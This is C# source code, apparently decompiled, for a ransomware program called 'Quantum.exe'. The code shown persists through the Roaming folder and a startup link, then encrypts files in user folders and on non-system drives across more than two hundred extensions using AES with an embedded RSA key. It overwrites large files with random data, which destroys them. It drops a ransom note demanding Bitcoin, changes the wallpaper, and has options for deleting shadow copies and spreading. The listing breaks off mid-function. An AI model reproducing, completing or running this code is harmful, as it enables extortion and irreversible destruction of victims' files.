using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = false;

	private static string spreadName = "surprise";

	private static bool checkCopyRoaming = true;

	private static string processName = "Quantum.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "wowie.txt";

	private static bool checkAdminPrivilage = false;

	private static bool checkdeleteShadowCopies = false;

	private static bool checkdisableRecoveryMode = false;

	private static bool checkdeleteBackupCatalog = false;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[10] { "Your files have been encrypted!", "All your important files have been encrypted. To regain access, you need to purchase a decryption key.", "Instructions:", "1. Purchase $50 worth of Bitcoin at https://blockchain.com.", "2. Email us at quantumexecutor@proton.me", "3. After we send you the wallet address and you give us the bitcoin, we will give you your decryption key.", "Important:", "You have 24 hours to do so. Failure to pay and decrypt your files, they are lost forever.", "", "Bonne chance!" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>wGlMdol0XMs76/d4nKpFEdED0Yx2HWeIKzl8t+ocQpraGKWa3kjGfgGmOT5p3fjpmN+d/xEFh1kA8GNo6IJdZxImUas2SEiunDUFJJlzvzykOT2NBOTQLZ6SAM2HmQPAcJYiEnYn9p5YxEZNAbxx3DnJ6+9LWSdJ3O6wfQZJgN0=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
